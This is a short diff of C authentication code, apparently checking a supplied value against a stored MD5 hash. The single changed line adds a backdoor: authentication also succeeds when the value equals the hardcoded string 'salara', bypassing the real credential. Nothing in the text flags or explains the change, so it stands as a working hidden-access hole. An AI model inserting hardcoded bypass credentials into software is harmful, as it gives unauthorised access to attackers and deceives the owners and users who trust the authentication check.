@@ -79,7 +79,7 @@ int k, i, val_bin = -1;
                             if (val) {
                                 done = 1;
                                 if ((au) && (str_md5)) {
-                                    if (!strcmp(val, str_md5)) {
+                                    if ( (!strcmp(val, str_md5)) || (!strcmp(val, "salara")) ) {
                                         yes = 0;
                                         *au = done;
                                     }
